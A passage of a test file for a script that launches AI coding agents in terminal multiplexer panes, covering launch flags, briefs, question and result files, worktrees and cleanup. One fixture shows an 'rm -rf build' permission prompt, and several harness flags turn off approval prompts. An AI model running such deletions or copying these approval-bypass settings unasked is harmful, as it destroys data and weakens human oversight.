import { afterEach, beforeEach, expect, test } from "bun:test";
import {
  chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { spawnSync } from "node:child_process";
import { isAbsolute, join } from "node:path";
import {
  askParent, briefText, close, detectMux, harnessArgs, launch, launchPrompt, list, main, nudgePrompt, panesRoot, peek, script, send, sh, waitFor,
} from "../plugins/pstack/skills/poteto-mode/scripts/pane-agent.mjs";

let root;
let brief;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "pstack-pane-"));
  brief = join(root, "task.md");
  writeFileSync(brief, "Review the diff.\n");
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

const herdrEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), HERDR_ENV: "1", HERDR_WORKSPACE_ID: "wP" });
const tuiosSelf = "98db8226-1829-468e-89a8-41a2baa0ddab";
const tuiosEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TUIOS_ENV: "1", TUIOS_SESSION: "work", TUIOS_PANE_ID: tuiosSelf });
const runDir = () => join(root, "panes", "arena-a");

const okJson = (result) => ({ status: 0, stdout: JSON.stringify({ id: "x", result }), stderr: "" });
const failJson = (code, message = code) => ({ status: 1, stdout: "", stderr: JSON.stringify({ error: { code, message } }) });
const agent = (status) => okJson({ agent: { agent_status: status } });
const text = (stdout) => ({ status: 0, stdout, stderr: "" });
const write = (file, body) => writeFileSync(join(runDir(), file), body);
const age = (file, seconds) => {
  const then = new Date(Date.now() - seconds * 1000);
  utimesSync(join(runDir(), file), then, then);
};

function scripted(rules) {
  const calls = [];
  const counters = new Map();
  const runner = (cmd, args, opts) => {
    calls.push([cmd, ...args]);
    const key = Object.keys(rules).find((k) => `${cmd} ${args.join(" ")}`.startsWith(k));
    if (!key) throw new Error(`unscripted call: ${cmd} ${args.join(" ")}`);
    let rule = rules[key];
    if (Array.isArray(rule)) {
      const n = counters.get(key) ?? 0;
      counters.set(key, n + 1);
      rule = rule[Math.min(n, rule.length - 1)];
    }
    return typeof rule === "function" ? rule(args, opts) : rule;
  };
  return { runner, calls };
}

const herdrBase = {
  "herdr tab create": okJson({ tab: { tab_id: "wP:t2" }, root_pane: { pane_id: "wP:p2" } }),
  "herdr agent start": okJson({ agent: { agent_status: "idle" } }),
  "herdr agent read": text("screen line one\nscreen line two\n\n"),
  "herdr tab close": okJson({ type: "ok" }),
  "herdr pane get": okJson({ pane: { agent_status: "working" } }),
};

const options = (extra = {}) => ({
  name: "arena-a", harness: "codex", model: "gpt-6.1-sol", effort: "xhigh", brief, cwd: root, ...extra,
});

test("harnessArgs builds each harness's launch flags from the registry", () => {
  const run = "/tmp/panes/arena-a";
  expect(harnessArgs("codex", { model: "gpt-6.1-sol", effort: "xhigh", access: "read", run })).toEqual([
    "-m", "gpt-6.1-sol", "-c", "model_reasoning_effort=xhigh", "-a", "never", "-s", "workspace-write",
    "-c", "sandbox_workspace_write.network_access=true", "--add-dir", run,
  ]);
  const network = ["-c", "sandbox_workspace_write.network_access=true"];
  expect(harnessArgs("codex", { model: "m", effort: null, access: "write", run }).join(" ")).toContain(network.join(" "));
  expect(harnessArgs("muse", { model: "m", effort: null, access: "read", run }).join(" ")).toContain("--sandbox-network enabled");
  const claude = harnessArgs("claude", { model: "claude-opus-5-5", effort: null, access: "read", run });
  expect(claude.slice(0, 4)).toEqual(["--model", "claude-opus-5-5", "--permission-mode", "dontAsk"]);
  expect(claude).not.toContain("--effort");
  expect(claude[5]).toContain(`Edit(/${run}/question.md),Edit(/${run}/result.md)`);
  expect(claude).toContain("AskUserQuestion");
  const writer = harnessArgs("claude", { model: "m", effort: "max", access: "write", run });
  expect(writer).toContain("--effort");
  expect(writer.join(" ")).toContain("Edit,Write,Bash");
});

test("the claude read profile allows asking the parent and no other new command", () => {
  const args = harnessArgs("claude", { model: "m", effort: null, access: "read", run: "/tmp/panes/arena-a" });
  expect(args[args.indexOf("--allowedTools") + 1].split(",")).toEqual([
    "Read", "Grep", "Glob", "Edit(//tmp/panes/arena-a/question.md)", "Edit(//tmp/panes/arena-a/result.md)", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)",
    "Bash(git status:*)", "Bash(git blame:*)", "Bash(git rev-parse:*)", "Bash(git ls-files:*)", "Bash(git grep:*)",
    "Bash(rg:*)", "Bash(ls:*)", "Bash(wc:*)", `Bash(node ${script} ask-parent:*)`,
  ]);
});

test("a brief with a parent names the agent and tells it to ask the parent pane, then end its turn", () => {
  const run = join(root, "a");
  const out = briefText("x", { run, access: "write", name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
  expect(out).toContain("You are pane agent arena-a.");
  expect(out).toContain(`run \`node ${script} ask-parent --run ${run}\`, and end your turn. If that command fails, end your turn anyway`);
  expect(out).toContain("## Launching your own pane agents");
  expect(out).toContain("so `--name fix` launches `arena-a-fix`. Every later `send`, `wait`, `peek`, and `close` takes the full name the launch printed.");
  expect(out).toContain(`node ${script} send --name <full-name> --text <answer> --answer <questionId>`);
  expect(briefText("x", { run, access: "read", name: "arena-a", parent: null })).not.toContain("ask-parent");
});

test("the brief carries the pane protocol with this agent's paths", () => {
  const run = join(root, "a");
  const out = briefText("Do the thing.\n", { run, access: "read" });
  expect(out.startsWith("Do the thing.\n")).toBe(true);
  expect(out).toContain(`${join("skills", "poteto-mode", "SKILL.md")} before working`);
  expect(out).toContain(`write only the question to ${join(run, "question.md")}`);
  expect(out).toContain(`write your complete final report to ${join(run, "result.md")}`);
  expect(out).toContain(`Do not modify any file except ${join(run, "result.md")} and ${join(run, "question.md")}.`);
  expect(briefText("x", { run, access: "write" })).toContain("Change only what the task assigns");
});

test("herdr launch opens one labelled tab, starts the harness in it, prompts with --wait, and returns the result", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": () => { write("result.md", "verdict: ok\n"); return agent("done"); },
  });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out).toMatchObject({ verdict: "done", result: "verdict: ok\n", name: "arena-a", mux: "herdr", harness: "codex" });
  const [tab, start, prompt] = calls;
  expect(tab).toEqual(["herdr", "tab", "create", "--workspace", "wP", "--cwd", root, "--label", "arena-a", "--no-focus"]);
  expect(start.slice(0, 9)).toEqual(["herdr", "agent", "start", "arena-a", "--kind", "codex", "--pane", "wP:p2", "--timeout"]);
  expect(start.slice(start.indexOf("--", 3) + 1)).toEqual(expect.arrayContaining(["-m", "gpt-6.1-sol", "-a", "never", "-s", "workspace-write", "sandbox_workspace_write.network_access=true"]));
  expect(prompt.slice(0, 4)).toEqual(["herdr", "agent", "prompt", "arena-a"]);
  expect(prompt).toContain("--wait");
  expect(prompt[4]).toContain("brief.md");
  expect(readFileSync(join(runDir(), "brief.md"), "utf8")).toContain("Review the diff.");
});

test("a question written after a draft result is pending, and send answers it, clearing both files", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": [
      () => { write("result.md", "status\n"); age("result.md", 60); write("question.md", "Which branch?\n"); return agent("done"); },
      () => {
        expect(existsSync(join(runDir(), "question.md"))).toBe(false);
        expect(existsSync(join(runDir(), "result.md"))).toBe(false);
        write("result.md", "final\n");
        return agent("done");
      },
    ],
  });
  const first = launch(options(), { runner, env: herdrEnv() });
  expect(first).toMatchObject({ verdict: "question", question: "Which branch?\n" });
  const second = send("arena-a", { text: "main" }, { runner, env: herdrEnv() });
  expect(second).toMatchObject({ verdict: "done", result: "final\n" });
  expect(calls.filter((c) => c[2] === "prompt").at(-1)[4]).toBe("main");
});

test("a question the human answered in the pane no longer masks the result written after it", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": () => { write("question.md", "Which branch?\n"); return agent("done"); },
    "herdr agent wait": () => { write("result.md", "final\n"); age("question.md", 60); return agent("done"); },
  });
  expect(launch(options(), { runner, env: herdrEnv() })).toMatchObject({ verdict: "question" });
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "final\n" });
});

test("a relative pane directory is resolved before it reaches the brief or the harness flags", () => {
  const root = panesRoot({ PSTACK_PANES_DIR: "relative/panes" });
  expect(isAbsolute(root)).toBe(true);
  expect(root.endsWith(join("relative", "panes"))).toBe(true);
});

test("a blocked TUI comes back as a blocked verdict with the screen, without a poll loop", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_blocked") });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out).toMatchObject({ verdict: "blocked", screen: "screen line one\nscreen line two" });
  expect(calls.filter((c) => c[2] === "prompt")).toHaveLength(1);
});

test("a harness blocked at startup reports blocked and never sends the prompt", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent start": failJson("agent_not_ready", "trust dialog") });
  expect(launch(options(), { runner, env: herdrEnv() }).verdict).toBe("blocked");
  expect(calls.some((c) => c[2] === "prompt")).toBe(false);
});

test("a turn that ends with neither file is nudged once, then reported as no_result", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": agent("done") });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out.verdict).toBe("no_result");
  const prompts = calls.filter((c) => c[2] === "prompt");
  expect(prompts).toHaveLength(2);
  expect(prompts[1][4]).toBe(nudgePrompt(runDir()));
});

test("each text the parent sends starts a turn with its own reminder", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": agent("done") });
  expect(launch(options(), { runner, env: herdrEnv() }).verdict).toBe("no_result");
  expect(calls.filter((c) => c[2] === "prompt")).toHaveLength(2);
  expect(send("arena-a", { text: "try again" }, { runner, env: herdrEnv() }).verdict).toBe("no_result");
  const prompts = calls.filter((c) => c[2] === "prompt");
  expect(prompts).toHaveLength(4);
  expect(prompts[2][4]).toBe("try again");
  expect(prompts[3][4]).toBe(nudgePrompt(runDir()));
});

test("a dropped first prompt recovers when the nudge lands", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": [agent("done"), () => { write("result.md", "late\n"); return agent("done"); }],
  });
  expect(launch(options(), { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "late\n" });
});

test("a wait timeout reports timeout with the screen", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": failJson("timeout") });
  expect(launch(options({ timeoutMs: 1000 }), { runner, env: herdrEnv() }))
    .toMatchObject({ verdict: "timeout", screen: expect.stringContaining("screen line") });
});

test("wait resumes a blocked agent and peek reads its screen", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": failJson("agent_blocked"),
    "herdr agent wait": () => { write("result.md", "after human answered\n"); return agent("done"); },
  });
  launch(options(), { runner, env: herdrEnv() });
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "after human answered\n" });
  expect(peek("arena-a", { runner, env: herdrEnv() }).screen).toContain("screen line one");
});

test("a blocked full-screen TUI still shows its dialog through the visible screen", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": failJson("agent_blocked"),
    "herdr agent read": (args) => args.includes("visible")
      ? text("Do you trust the contents of this project?\n> Yes, I trust this folder\n")
      : failJson("agent_not_idle", "cannot read 60 lines while arena-a is blocked"),
  });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out).toMatchObject({ verdict: "blocked", screen: expect.stringContaining("trust the contents") });
  expect(calls.filter((c) => c[2] === "read").map((c) => c[5])).toEqual(["recent-unwrapped", "visible"]);
});

test("send --keys maps key names, waits out the blocked state, then settles", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": failJson("agent_blocked"),
    "herdr agent send-keys": okJson({ type: "ok" }),
    "herdr agent get": [agent("blocked"), agent("working")],
    "herdr agent wait": () => { write("result.md", "approved\n"); return agent("done"); },
  });
  launch(options(), { runner, env: herdrEnv() });
  const out = send("arena-a", { keys: "Down Escape" }, { runner, env: herdrEnv() });
  expect(out.verdict).toBe("done");
  expect(calls.find((c) => c[2] === "send-keys")).toEqual(["herdr", "agent", "send-keys", "arena-a", "Down", "esc"]);
});

test("close removes the tab and the run directory, or keeps the directory on request", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  expect(list({ env: herdrEnv() }).map((a) => a.name)).toEqual(["arena-a"]);
  const kept = close("arena-a", { keep: true }, { runner, env: herdrEnv() });
  expect(kept.closed).toBe(true);
  expect(existsSync(join(runDir(), "result.md"))).toBe(true);
  close("arena-a", {}, { runner, env: herdrEnv() });
  expect(calls.filter((c) => c[2] === "close").map((c) => c[3])).toEqual(["wP:t2", "wP:t2"]);
  expect(existsSync(runDir())).toBe(false);
  expect(list({ env: herdrEnv() })).toEqual([]);
});

test("a failed launch tears down its tab and run directory", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent start": failJson("exec_failed", "no codex") });
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("agent start failed");
  expect(calls.some((c) => c[2] === "close")).toBe(true);
  expect(existsSync(runDir())).toBe(false);
});

const gitIn = (cwd, ...args) => {
  const r = spawnSync("git", ["-C", cwd, ...args], { encoding: "utf8" });
  if (r.status !== 0) throw new Error(r.stderr);
  return r.stdout.trim();
};
function repo() {
  const dir = join(realpathSync(root), "repo");
  mkdirSync(dir);
  gitIn(dir, "init", "-q", "-b", "main");
  writeFileSync(join(dir, "a.txt"), "committed\n");
  gitIn(dir, "add", "a.txt");
  gitIn(dir, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init");
  return dir;
}
const finished = () => scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
const branches = (dir) => gitIn(dir, "branch", "--format=%(refname:short)").split("\n");

test("a write launch runs in a new worktree of the committed HEAD, and close removes it with its unused branch", () => {
  const dir = repo();
  writeFileSync(join(dir, "a.txt"), "uncommitted\n");
  const { runner, calls } = finished();
  const out = launch(options({ access: "write", cwd: dir }), { runner, env: herdrEnv() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  expect(out).toMatchObject({ verdict: "done", worktree: tree, route: "git" });
  expect(calls[0]).toContain(tree);
  expect(readFileSync(join(tree, "a.txt"), "utf8")).toBe("committed\n");
  expect(gitIn(tree, "branch", "--show-current")).toBe("pstack/arena-a");
  expect(list({ env: herdrEnv() })[0].worktree).toBe(tree);
  expect(close("arena-a", {}, { runner, env: herdrEnv() }).worktree).toEqual({ path: tree, removed: true, branch: null });
  expect(existsSync(tree)).toBe(false);
  expect(branches(dir)).toEqual(["main"]);
  expect(readFileSync(join(dir, "a.txt"), "utf8")).toBe("uncommitted\n");
});

test("close keeps a worktree with uncommitted changes, and keeps the branch of a worker that committed", () => {
  const dir = repo();
  const { runner } = finished();
  launch(options({ access: "write", cwd: dir }), { runner, env: herdrEnv() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  writeFileSync(join(tree, "a.txt"), "worker edit\n");
  expect(close("arena-a", {}, { runner, env: herdrEnv() }).worktree).toEqual({ path: tree, removed: false, branch: "pstack/arena-a" });
  expect(readFileSync(join(tree, "a.txt"), "utf8")).toBe("worker edit\n");
  gitIn(tree, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-am", "work");
  gitIn(dir, "worktree", "remove", tree);
  const writesB = scripted({ ...herdrBase, "herdr agent prompt": () => { writeFileSync(join(root, "panes", "arena-b", "result.md"), "r\n"); return agent("done"); } });
  launch(options({ access: "write", cwd: dir, name: "arena-b" }), { runner: writesB.runner, env: herdrEnv() });
  const second = `${dir}__worktrees/pstack-arena-b`;
  gitIn(second, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "work");
  expect(close("arena-b", {}, { runner: writesB.runner, env: herdrEnv() }).worktree).toEqual({ path: second, removed: true, branch: "pstack/arena-b" });
  expect(branches(dir)).toEqual(["main", "pstack/arena-a", "pstack/arena-b"]);
});

test("close --discard removes a worktree with uncommitted changes and deletes its branch with commits", () => {
  const dir = repo();
  const { runner } = finished();
  launch(options({ access: "write", cwd: dir }), { runner, env: herdrEnv() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  gitIn(tree, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "work");
  writeFileSync(join(tree, "a.txt"), "worker edit\n");
  expect(close("arena-a", { discard: true }, { runner, env: herdrEnv() }).worktree).toEqual({ path: tree, removed: true, branch: null });
  expect(existsSync(tree)).toBe(false);
  expect(branches(dir)).toEqual(["main"]);
  expect(() => close("arena-a", { keep: true, discard: true }, { runner, env: herdrEnv() })).toThrow("--keep or --discard");
});

test("--in-place and read access run in the given directory with no worktree", () => {
  const dir = repo();
  const { runner, calls } = finished();
  const out = launch(options({ access: "write", cwd: dir, inPlace: true }), { runner, env: herdrEnv() });
  expect(out.worktree).toBeUndefined();
  expect(calls[0]).toContain(dir);
  close("arena-a", {}, { runner, env: herdrEnv() });
  launch(options({ cwd: dir }), { runner, env: herdrEnv() });
  expect(existsSync(`${dir}__worktrees`)).toBe(false);
  expect(branches(dir)).toEqual(["main"]);
});

test("a relaunch under a name whose worktree or branch is left over is refused before any pane opens", () => {
  const dir = repo();
  const { runner } = finished();
  launch(options({ access: "write", cwd: dir }), { runner, env: herdrEnv() });
  writeFileSync(join(`${dir}__worktrees/pstack-arena-a`, "a.txt"), "worker edit\n");
  close("arena-a", {}, { runner, env: herdrEnv() });
  const again = finished();
  expect(() => launch(options({ access: "write", cwd: dir }), { runner: again.runner, env: herdrEnv() })).toThrow("left from an earlier arena-a");
  expect(again.calls).toEqual([]);
  expect(existsSync(runDir())).toBe(false);
  expect(readFileSync(join(`${dir}__worktrees/pstack-arena-a`, "a.txt"), "utf8")).toBe("worker edit\n");
});

test("a write launch from a subdirectory starts in the same subdirectory of its worktree", () => {
  const dir = repo();
  mkdirSync(join(dir, "pkg"));
  writeFileSync(join(dir, "pkg", "b.txt"), "b\n");
  gitIn(dir, "add", "pkg");
  gitIn(dir, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "pkg");
  const { runner, calls } = finished();
  launch(options({ access: "write", cwd: join(dir, "pkg") }), { runner, env: herdrEnv() });
  expect(calls[0][calls[0].indexOf("--cwd") + 1]).toBe(`${dir}__worktrees/pstack-arena-a/pkg`);
});

test("a nested write launch runs in its parent agent's directory with no worktree", () => {
  const dir = repo();
  const { runner } = doneHerdr();
  launch(options({ cwd: dir }), { runner, env: herdrEnv() });
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  const out = launch(options({ name: "fix", access: "write", cwd: dir }), { runner, env: childEnv });
  expect(out).toMatchObject({ name: "arena-a-fix" });
  expect(out.worktree).toBeUndefined();
  expect(existsSync(`${dir}__worktrees`)).toBe(false);
  expect(readFileSync(join(root, "panes", "arena-a", "brief.md"), "utf8")).not.toContain("not in worktrees of their own");
  expect(readFileSync(join(root, "panes", "arena-a-fix", "brief.md"), "utf8")).toContain("not in worktrees of their own");
});

test("a write launch outside a git repository is refused before any pane opens", () => {
  const { runner, calls } = finished();
  expect(() => launch(options({ access: "write" }), { runner, env: herdrEnv() })).toThrow("git rev-parse");
  expect(calls).toEqual([]);
  expect(existsSync(runDir())).toBe(false);
});

test("a failed write launch removes its worktree and branch", () => {
  const dir = repo();
  const { runner } = scripted({ ...herdrBase, "herdr agent start": failJson("exec_failed", "no codex") });
  expect(() => launch(options({ access: "write", cwd: dir }), { runner, env: herdrEnv() })).toThrow("agent start failed");
  expect(existsSync(`${dir}__worktrees/pstack-arena-a`)).toBe(false);
  expect(branches(dir)).toEqual(["main"]);
});

test("launch refuses bad input before touching a multiplexer", () => {
  const { runner, calls } = scripted({});
  const env = herdrEnv();
  expect(() => launch(options({ name: "Arena A" }), { runner, env })).toThrow("--name must match");
  expect(() => launch(options({ harness: "nope" }), { runner, env })).toThrow("--harness must be one of");
  expect(() => launch(options({ effort: "turbo", harness: "claude", model: "m" }), { runner, env })).toThrow("Unsupported claude effort");
  expect(() => launch(options({ effort: "high", harness: "opencode", model: "openai/gpt-6.1-sol" }), { runner, env })).toThrow("opencode takes no effort setting");
  expect(() => launch(options({ effort: "xhigh", harness: "agy", model: "gemini-3.8-flash" }), { runner, env })).toThrow("Unsupported agy effort for launch: xhigh (use low, medium, high)");
  expect(() => launch(options({ brief: join(root, "missing.md") }), { runner, env })).toThrow("--brief must name an existing file");
  expect(() => launch(options({ access: "root" }), { runner, env })).toThrow("--access is read or write");
  expect(calls).toEqual([]);
});

test("a second launch under a live name is refused", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("already exists");
});

test("detectMux picks the running multiplexer and refuses to guess", () => {
  expect(detectMux({ HERDR_ENV: "1" })).toBe("herdr");
  expect(detectMux({ TUIOS_ENV: "1" })).toBe("tuios");
  expect(detectMux({}, "tuios")).toBe("tuios");
  expect(() => detectMux({ HERDR_ENV: "1", TUIOS_ENV: "1" })).toThrow("pass --mux");
  expect(() => detectMux({})).toThrow("Not running inside herdr, tuios, tmux, or Rex");
  const rex = { REX_SESSION: "session:x", REX_BLOCK: "block:y" };
  expect(detectMux(rex)).toBe("rex");
  expect(detectMux({ ...rex, HERDR_ENV: "1" })).toBe("herdr");
  expect(detectMux({ ...rex, TMUX: "/tmp/t,1,0", TMUX_PANE: "%0" })).toBe("tmux");
  expect(() => detectMux({ ...rex, HERDR_ENV: "1", TUIOS_ENV: "1" })).toThrow("pass --mux herdr or --mux tuios");
});

test("detectMux finds tmux and names every multiplexer it finds when more than one is set", () => {
  expect(detectMux({ TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" })).toBe("tmux");
  expect(() => detectMux({ HERDR_ENV: "1", TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" }))
    .toThrow("More than one multiplexer is set in this environment (herdr, tmux)");
});

const tuiosState = (state) => ({ status: 0, stdout: JSON.stringify({ state }), stderr: "" });
const tuiosBase = {
  "tuios new-window": text("win-1\n"),
  "tuios capture-pane": text("tuios screen\n"),
  "tuios run-command": text("ok\n"),
};

test("tuios launch opens a named window that runs the harness with the prompt, then waits on events in two phases", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("idle"), tuiosState("working"), tuiosState("done")],
    "tuios wait-for": (args) => {
      if (args.includes("idle,done,needs_input,errored")) write("result.md", "tuios result\n");
      return text("");
    },
  });
  const out = launch(options(), { runner, env: tuiosEnv() });
  expect(out).toMatchObject({ verdict: "done", result: "tuios result\n", mux: "tuios" });
  const open = calls[0];
  expect(open.slice(0, 9)).toEqual(["tuios", "new-window", "-s", "work", "arena-a", "--cwd", root, "--no-focus", "--print-id"]);
  const argv = open.slice(open.indexOf("--", 3) + 1);
  expect(argv[0]).toBe("codex");
  expect(argv.at(-1)).toContain("brief.md");
  const waits = calls.filter((c) => c[1] === "wait-for").map((c) => c[c.indexOf("--until") + 1]);
  expect(waits).toEqual(["working,needs_input,errored,done", "idle,done,needs_input,errored"]);
});

test("tuios puts the prompt before the flags for a harness with variadic tool flags", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options({ harness: "claude", model: "claude-opus-5-5", effort: "high" }), { runner, env: tuiosEnv() });
  const argv = calls[0].slice(calls[0].indexOf("--", 3) + 1);
  expect(argv[0]).toBe("claude");
  expect(argv[1]).toContain("brief.md");
  expect(argv[2]).toBe("--model");
});

test("tuios hands a harness its prompt through the registry's prompt template, after the flags", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options({ harness: "agy", model: "gemini-3.8-flash-high", effort: null }), { runner, env: tuiosEnv() });
  const argv = calls[0].slice(calls[0].indexOf("--", 3) + 1);
  expect(argv.slice(0, 4)).toEqual(["agy", "--model", "gemini-3.8-flash-high", "--dangerously-skip-permissions"]);
  expect(argv.slice(4, 6)).toEqual(["--add-dir", runDir()]);
  expect(argv[6]).toBe("-i");
  expect(argv[7]).toContain("brief.md");
  expect(argv).toHaveLength(8);
});

test("tuios passes a bare prompt last to a harness with no prompt template", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options({ harness: "grok", model: "grok-4.7", effort: "high" }), { runner, env: tuiosEnv() });
  const argv = calls[0].slice(calls[0].indexOf("--", 3) + 1);
  expect(argv.slice(0, 6)).toEqual(["grok", "-m", "grok-4.7", "--reasoning-effort", "high", "--always-approve"]);
  expect(argv).toHaveLength(7);
  expect(argv[6]).toContain("brief.md");
});

test("tuios reports a needs_input agent as blocked using its own prompt reader", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("needs_input"),
    "tuios wait-for": text(""),
    "tuios peek-prompt": text("Allow Bash: rm -rf build? [y/n]\n"),
  });
  const out = launch(options(), { runner, env: tuiosEnv() });
  expect(out).toMatchObject({ verdict: "blocked", screen: "Allow Bash: rm -rf build? [y/n]" });
  expect(calls.some((c) => c[1] === "capture-pane")).toBe(false);
});

test("a tuios window that vanished is an error verdict, not a hang", () => {
  const gone = { status: 1, stdout: "", stderr: "window not found" };
  const { runner } = scripted({ ...tuiosBase, "tuios get-agent-state": gone, "tuios wait-for": gone });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "error", detail: expect.stringContaining("gone") });
});

test("tuios send goes through ask-agent and close closes the window by name", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
    "tuios ask-agent": () => { write("result.md", "second\n"); return text("answer printed\n"); },
  });
  launch(options(), { runner, env: tuiosEnv() });
  expect(send("arena-a", { text: "use main" }, { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "second\n" });
  const ask = calls.find((c) => c[1] === "ask-agent");
  expect(ask).toContain("use main");
  expect(ask.slice(ask.indexOf("--from"), ask.indexOf("--from") + 2)).toEqual(["--from", tuiosSelf]);
  close("arena-a", {}, { runner, env: tuiosEnv() });
  expect(calls.at(-1)).toEqual(["tuios", "run-command", "-s", "work", "CloseWindow", "arena-a"]);
});

const prompts = (calls) => calls.filter((c) => c[2] === "prompt");

test("herdr launch --no-wait leaves the brief for wait to deliver, exactly once", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent wait": agent("idle"),
    "herdr agent prompt": () => { write("result.md", "delivered late\n"); return agent("done"); },
  });
  expect(launch(options({ wait: false }), { runner, env: herdrEnv() })).toMatchObject({ launched: true });
  expect(prompts(calls)).toHaveLength(0);
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "delivered late\n" });
  expect(prompts(calls)).toHaveLength(1);
  expect(prompts(calls)[0][4]).toBe(launchPrompt(runDir()));
});

test("a startup dialog the human clears is followed by the brief, not by no_result", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent start": failJson("agent_not_ready", "trust dialog"),
    "herdr agent wait": agent("idle"),
    "herdr agent prompt": () => { write("result.md", "after trust\n"); return agent("done"); },
  });
  expect(launch(options(), { runner, env: herdrEnv() }).verdict).toBe("blocked");
  expect(prompts(calls)).toHaveLength(0);
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "after trust\n" });
  expect(prompts(calls)).toHaveLength(1);
  expect(prompts(calls)[0][4]).toBe(launchPrompt(runDir()));
});

test("a wait that is still blocked at startup does not send the brief", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent start": failJson("agent_not_ready", "login"),
    "herdr agent wait": agent("blocked"),
  });
  launch(options(), { runner, env: herdrEnv() });
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() }).verdict).toBe("blocked");
  expect(prompts(calls)).toHaveLength(0);
});

test("a prompt herdr reports as stalled is not typed a second time", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_prompt_stalled") });
  expect(launch(options(), { runner, env: herdrEnv() })).toMatchObject({ verdict: "stalled", screen: expect.stringContaining("screen line") });
  expect(prompts(calls)).toHaveLength(1);
});

test("a failed tab create surfaces the herdr error and leaves nothing behind", () => {
  const { runner } = scripted({ "herdr tab create": failJson("workspace_not_found", "no such workspace") });
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("tab create failed: workspace_not_found");
  expect(existsSync(runDir())).toBe(false);
  expect(list({ env: herdrEnv() })).toEqual([]);
});

test("a missing multiplexer binary names the cause instead of an empty message", () => {
  const missing = sh("pstack-no-such-binary", []);
  expect(missing.status).not.toBe(0);
  expect(missing.stderr).toContain("pstack-no-such-binary");
});

test("launch refuses a model or effort that could be read as a flag", () => {
  const { runner, calls } = scripted({});
  expect(() => launch(options({ model: "-m" }), { runner, env: herdrEnv() })).toThrow("--model");
  expect(() => launch(options({ model: "a b" }), { runner, env: herdrEnv() })).toThrow("--model");
